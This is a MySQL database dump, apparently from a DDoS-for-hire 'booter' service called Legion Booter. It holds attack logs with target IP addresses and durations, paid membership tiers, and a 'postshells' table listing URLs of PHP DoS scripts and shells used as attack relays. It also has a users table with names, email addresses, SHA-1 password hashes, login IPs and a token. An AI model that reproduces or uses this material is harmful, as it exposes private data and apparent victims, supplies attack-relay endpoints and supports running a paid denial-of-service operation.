INSERT INTO `logs` (`username`, `ip`, `time`, `port`, `date`) VALUES
('Deceive', '174.143.55.236', '120', '80', '09-05-2011, 06:57:38 am'),
('Deceive', '71.85.210.57', '10', '80', '09-05-2011, 06:58:47 am'),
('Deceive', '71.85.210.57', '30', '80', '09-05-2011, 07:02:59 am'),
('Deceive', '71.85.210.57', '10', '80', '09-05-2011, 07:05:59 am'),
('Deceive', '71.85.210.57', '30', '80', '09-05-2011, 07:10:56 am'),
('Deceive', '71.85.212.244', '30', '80', '09-06-2011, 12:55:50 am'),
('MrdoPii', '184.27.173.69', '30', '80', '09-06-2011, 01:08:06 am'),
('MrdoPii', '70.95.48.252', '30', '80', '09-06-2011, 01:17:43 am'),
('MrdoPii', '68.231.155.71', '30', '80', '09-06-2011, 01:22:05 am'),
('MrdoPii', '96.2.25.88', '30', '80', '09-06-2011, 01:24:32 am'),
('MrdoPii', '68.82.146.172', '30', '80', '09-06-2011, 01:26:42 am'),
('MrdoPii', '75.66.179.130', '60', '80', '09-06-2011, 01:31:13 am'),
('MrdoPii', '75.66.179.130', '75', '80', '09-06-2011, 01:36:16 am'),
('MrdoPii', '75.66.176.172', '75', '80', '09-06-2011, 01:38:31 am'),
('MrdoPii', '68.231.155.71', '60', '80', '09-06-2011, 01:43:28 am'),
('MrdoPii', '98.249.246.100', '30', '80', '09-06-2011, 01:49:53 am'),
('MrdoPii', '68.174.40.97', '30', '80', '09-06-2011, 01:55:08 am'),
('MrdoPii', '97.114.27.4', '30', '80', '09-06-2011, 01:58:03 am'),
('MrdoPii', '76.28.74.105', '30', '80', '09-06-2011, 02:01:34 am'),
('MrdoPii', '65.55.42.52', '30', '80', '09-06-2011, 02:06:59 am'),
('MrdoPii', '65.55.42.52', '30', '80', '09-06-2011, 02:09:01 am'),
('MrdoPii', '72.70.13.97', '55', '80', '09-06-2011, 02:10:48 am'),
('MrdoPii', '99.140.91.31', '80', '80', '09-06-2011, 02:26:08 am'),
('MrdoPii', '99.140.91.31', '80', '80', '09-06-2011, 02:28:44 am'),
('MrdoPii', '66.229.174.86', '60', '80', '09-06-2011, 03:45:07 am'),
('MrdoPii', '66.229.174.86', '60', '80', '09-06-2011, 03:48:16 am'),
('MrdoPii', '66.229.174.86', '120', '80', '09-06-2011, 03:53:14 am'),
('MrdoPii', '66.229.174.86', '120', '80', '09-06-2011, 03:58:02 am');

-- --------------------------------------------------------

--
-- Table structure for table `memberships`
--

CREATE TABLE IF NOT EXISTS `memberships` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(255) NOT NULL,
  `description` text NOT NULL,
  `price` float(10,2) NOT NULL DEFAULT '0.00',
  `days` int(5) NOT NULL DEFAULT '0',
  `period` varchar(1) NOT NULL DEFAULT 'D',
  `trial` tinyint(1) NOT NULL DEFAULT '0',
  `recurring` tinyint(1) NOT NULL DEFAULT '0',
  `private` tinyint(1) NOT NULL DEFAULT '0',
  `active` tinyint(1) NOT NULL DEFAULT '1',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=11 ;

--
-- Dumping data for table `memberships`
--

INSERT INTO `memberships` (`id`, `title`, `description`, `price`, `days`, `period`, `trial`, `recurring`, `private`, `active`) VALUES
(10, '3 Months Gold', '3 Months to Gold Access.', 25.00, 3, 'M', 0, 1, 0, 1),
(9, '3 Months Gold', '3 Months to Gold Access.', 25.00, 3, 'M', 0, 1, 0, 1),
(8, '1 Month Gold', '1 Month to Gold Access.', 15.00, 1, 'M', 0, 1, 0, 1),
(6, '24 Hour Trial', '24 Hours to Gold Access.', 2.00, 1, 'D', 0, 1, 0, 1),
(7, '1 Week Gold', '1 Week to Gold Access.', 6.50, 1, 'W', 0, 1, 0, 1);

-- --------------------------------------------------------

--
-- Table structure for table `news`
--

CREATE TABLE IF NOT EXISTS `news` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(55) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `body` text CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `author` varchar(55) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `created` date NOT NULL DEFAULT '0000-00-00',
  `active` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;

--
-- Dumping data for table `news`
--

INSERT INTO `news` (`id`, `title`, `body`, `author`, `created`, `active`) VALUES
(1, 'Welcome to our Client Area!', 0x266c743b702667743b57652061726520706c656173656420746f20616e6e6f756e636520746865206e65772072656c65617365206f662054686520437573746f6d20536f75726365207620322e30266c743b62722f2667743b266c743b2f702667743b, 'Administrator', '2011-07-10', 1);

-- --------------------------------------------------------

--
-- Table structure for table `payments`
--

CREATE TABLE IF NOT EXISTS `payments` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `txn_id` varchar(100) DEFAULT NULL,
  `membership_id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `rate_amount` varchar(255) NOT NULL,
  `currency` varchar(4) DEFAULT NULL,
  `date` datetime NOT NULL,
  `pp` enum('PayPal','MoneyBookers') DEFAULT NULL,
  `ip` varchar(20) DEFAULT NULL,
  `status` int(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=4 ;

--
-- Dumping data for table `payments`
--

INSERT INTO `payments` (`id`, `txn_id`, `membership_id`, `user_id`, `rate_amount`, `currency`, `date`, `pp`, `ip`, `status`) VALUES
(1, NULL, 2, 1, '5.00', 'CAD', '2011-04-05 14:12:32', 'PayPal', NULL, 1),
(2, NULL, 2, 2, '5.00', 'CAD', '2011-03-12 14:12:32', 'PayPal', NULL, 0),
(3, NULL, 3, 3, '10.00', 'CAD', '2011-03-05 16:47:36', 'MoneyBookers', NULL, 1);

-- --------------------------------------------------------

--
-- Table structure for table `postshells`
--

CREATE TABLE IF NOT EXISTS `postshells` (
  `URL` varchar(9001) NOT NULL,
  `online` int(1) NOT NULL DEFAULT '0',
  `lastChecked` int(10) NOT NULL DEFAULT '0'
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `postshells`
--

INSERT INTO `postshells` (`URL`, `online`, `lastChecked`) VALUES
('http://feeds2.feedburner.com/alivingtruth/DRwH', 0, 0),
('http://d-dos.50webs.com/ddos.php', 0, 0),
('http://belakshell.50webs.com/index.php', 0, 0),
('http://reksa.indonesianhacker.com/php_dos/', 0, 0),
('http://yogeshmehra1987.110mb.com/index.php', 0, 0),
('http://kala13.110mb.com/dos/', 0, 0),
('http://urmybest.110mb.com/phpdos.php', 0, 0),
('http://urmybest.110mb.com/phpdos.php ', 0, 0),
('http://yogeshmehra1987.110mb.com/index.php ', 0, 0),
('http://firman-mannte.blogspot.com/2011_04_01_archive.html', 0, 0),
('http://beacheater.blogspot.com/2011/01/php-dos.html	', 0, 0),
('http://zhan.liechesk.cn/hechihuagong.com.cn-domain', 0, 0),
('http://toutsourtous.webobo.biz/html.php?id_menu=3336677', 0, 0),
('http://toutsourtous.webobo.com/html.php?id_menu=3336677', 0, 0),
('http://www.anarchistcookbook.com/showthread.php/33795-PHP-DoS-Script	', 0, 0),
('http://toutsourtous.anatoile.com/html.php?id_menu=3206841', 0, 0),
('http://kala13.110mb.com/dos/index.php', 0, 0),
('http://www.fahriozturk.tr.gg/111.htm?PHP...7b1fb9bcef', 0, 0),
('http://toutsourtous.webobo.biz/html.php?id_menu=3336677 ', 0, 0),
('http://www.anarchistcookbook.com/showthread.php/33795-PHP-DoS-Script', 0, 0),
('http://dot.biz.uz/hajar/ ', 0, 0),
('http://www.tux-planet.fr/public/hack/ddos/php-dos.phps', 0, 0),
('http://feeds2.feedburner.com/alivingtruth/DRwH/', 0, 0),
('http://pastie.org/pastes/1044528/download', 0, 0),
('http://kala13.110mb.com/dos/ ', 0, 0),
('http://pastie.org/pastes/1044528/download/', 0, 0),
('http://pickme.3x.ro/uploads/cyber.php', 0, 0),
('http://eq22.weebly.com/', 0, 0),
('http://firman-mannte.blogspot.com/', 0, 0),
('http://feeds2.feedburner.com/alivingtruth/DRwH ', 0, 0),
('http://reksa.indonesianhacker.com/php_dos/ ', 0, 0),
(' http://pastie.org/pastes/1044528/download/', 0, 0),
('http://www.fahriozturk.tr.gg/111.htm?PHP...7b1fb9b...', 0, 0),
('http://dot.biz.uz/hajar/', 0, 0),
(' http://feeds2.feedburner.com/alivingtruth/DRwH/', 0, 0),
(' http://belakshell.50webs.com/index.php', 0, 0),
(' http://reksa.indonesianhacker.com/php_dos/', 0, 0),
(' http://d-dos.50webs.com/ddos.php', 0, 0),
(' http://yogeshmehra1987.110mb.com/index.php', 0, 0),
(' http://kala13.110mb.com/dos/', 0, 0),
(' http://urmybest.110mb.com/phpdos.php', 0, 0),
('http://www.fahriozturk.tr.gg/111.htm?PHP...7b1fb9bcef/ ', 0, 0),
('http://www.dinamo.com.nu/php/', 0, 0),
('http://sxleton.awardspace.us/', 0, 0),
('http://www.fahriozturk.tr.gg/111.htm?PHP...7b1fb9bcef/index.php', 0, 0),
('http://sxleton.awardspace.us/index.php', 0, 0),
('http://www.fahriozturk.tr.gg/111.htm/', 0, 0),
('http://sxleton.awardspace.us//', 0, 0),
('http://sxleton.awardspace.us', 0, 0),
('http://beacheater.blogspot.com/2011/01/php-dos.html', 0, 0),
('http://sxleton.awardspace.us/index.php?a...ools&amp;host=/', 0, 0),
('http://sxleton.awardspace.us/index.php?act=phptools&amp;host=/', 0, 0),
('http://www.fahriozturk.tr.gg/111.htm?PHPSESSID=8e7.../', 0, 0),
('http://www.fahriozturk.tr.gg/111.htm?PHP...7b1fb9b.../', 0, 0),
('http://www.fahriozturk.tr.gg/111.htm', 0, 0),
(' http://www.fahriozturk.tr.gg/111.htm', 0, 0),
('http://www.fahriozturk.tr.gg/111.htm?PHP...7b1fb9bcef/', 0, 0),
('http://www.fahriozturk.tr.gg/111.htm?PHPSESSID=8e7...', 0, 0),
('http://rahmat.tv/mount/php-dos-coded-by-exe.htm', 0, 0);

-- --------------------------------------------------------

--
-- Table structure for table `settings`
--

CREATE TABLE IF NOT EXISTS `settings` (
  `site_name` varchar(50) DEFAULT NULL,
  `site_email` varchar(40) DEFAULT NULL,
  `site_url` varchar(200) DEFAULT NULL,
  `reg_allowed` tinyint(1) NOT NULL DEFAULT '1',
  `user_limit` tinyint(1) NOT NULL DEFAULT '0',
  `reg_verify` tinyint(1) NOT NULL DEFAULT '0',
  `notify_admin` tinyint(1) NOT NULL DEFAULT '0',
  `auto_verify` tinyint(1) NOT NULL DEFAULT '0',
  `user_perpage` varchar(4) NOT NULL DEFAULT '10',
  `thumb_w` varchar(4) NOT NULL,
  `thumb_h` varchar(4) NOT NULL,
  `backup` varchar(60) DEFAULT NULL,
  `currency` varchar(4) DEFAULT NULL,
  `cur_symbol` varchar(3) DEFAULT NULL,
  `mailer` enum('PHP','SMTP') NOT NULL DEFAULT 'PHP',
  `smtp_host` varchar(100) DEFAULT NULL,
  `smtp_user` varchar(50) DEFAULT NULL,
  `smtp_pass` varchar(50) DEFAULT NULL,
  `smtp_port` varchar(6) DEFAULT NULL,
  `version` varchar(5) DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- Dumping data for table `settings`
--

INSERT INTO `settings` (`site_name`, `site_email`, `site_url`, `reg_allowed`, `user_limit`, `reg_verify`, `notify_admin`, `auto_verify`, `user_perpage`, `thumb_w`, `thumb_h`, `backup`, `currency`, `cur_symbol`, `mailer`, `smtp_host`, `smtp_user`, `smtp_pass`, `smtp_port`, `version`) VALUES
('Legion Booter', 'legionbooter@hotmail.com', 'http://legionbooter.info', 1, 0, 1, 0, 1, '10', '80', '100', '', 'CAD', '$', 'PHP', '', '', '', '0', '2.0');

-- --------------------------------------------------------

--
-- Table structure for table `slowloris`
--

CREATE TABLE IF NOT EXISTS `slowloris` (
  `URL` varchar(1000) NOT NULL,
  `online` int(1) NOT NULL DEFAULT '0',
  `lastChecked` int(10) NOT NULL DEFAULT '0'
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE IF NOT EXISTS `users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `password` varchar(50) NOT NULL,
  `membership_id` tinyint(3) NOT NULL DEFAULT '0',
  `mem_expire` datetime DEFAULT '0000-00-00 00:00:00',
  `trial_used` tinyint(1) NOT NULL DEFAULT '0',
  `email` varchar(32) NOT NULL,
  `fname` varchar(32) NOT NULL,
  `lname` varchar(32) NOT NULL,
  `token` varchar(40) NOT NULL DEFAULT '0',
  `newsletter` tinyint(1) NOT NULL DEFAULT '0',
  `userlevel` tinyint(1) NOT NULL DEFAULT '1',
  `created` datetime DEFAULT '0000-00-00 00:00:00',
  `lastlogin` datetime DEFAULT '0000-00-00 00:00:00',
  `lastip` varchar(16) DEFAULT '0',
  `avatar` varchar(150) DEFAULT NULL,
  `active` enum('y','n','t','b') NOT NULL DEFAULT 'n',
  `myAttacks` varchar(5000) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=11 ;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `username`, `password`, `membership_id`, `mem_expire`, `trial_used`, `email`, `fname`, `lname`, `token`, `newsletter`, `userlevel`, `created`, `lastlogin`, `lastip`, `avatar`, `active`, `myAttacks`) VALUES
(10, 'Deceive', 'a9136c70f7062283456ee7ddb679a699a0acf5c5', 9, '2011-12-05 00:55:35', 0, 'legionbooter@hotmail.com', 'Web', 'Master', '0', 0, 9, '2011-09-05 05:47:36', '2011-09-06 00:50:25', '71.85.212.244', '', 'y', '6'),
(2, 'DanesxD', 'f24d94daafa069eef94a9b3e4636113c0145f4ff', 6, '2011-09-06 22:05:11', 0, 'danes@hotmail.com', 'Dane', 'Roro', '0', 0, 9, '2011-09-05 22:05:11', '2011-09-05 22:07:29', '24.234.194.205', NULL, 'y', ''),
(3, 'MrdoPii', 'af8b443e6898bcf8d41e3fd61fe674b75379c3c3', 8, '2011-10-06 00:51:57', 0, 'jcorrna@yahoo.com', 'Andy', 'Linares', '0', 0, 1, '2011-09-06 00:51:57', '2011-09-06 04:29:29', '174.48.5.85', '', 'y', '22'),
(1, 'test', '3c37f78b94ca21941b902ffb0a67143fc4373ae5', 9, '2011-12-05 13:09:35', 0, 'benlove94@hotmail.co.uk', 'Ben', 'Love', 'ed67a12f7c24b47b77bfff6b538005c476b028d8', 0, 9, '2011-09-06 12:53:37', '2011-09-06 12:56:37', '86.162.152.46', '', 'y', ''),
(5, 'Orgy', '9d74d4e49cd7a1fb862a69cbbb6f3cc896a9984b', 9, '0000-00-00 00:00:00', 0, 'rrawbb@gmail.com', 'ORGY', 'LOL', '0', 0, 9, '2011-09-06 12:53:46', '2011-09-06 12:55:46', '173.93.199.231', NULL, 'y', '');

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
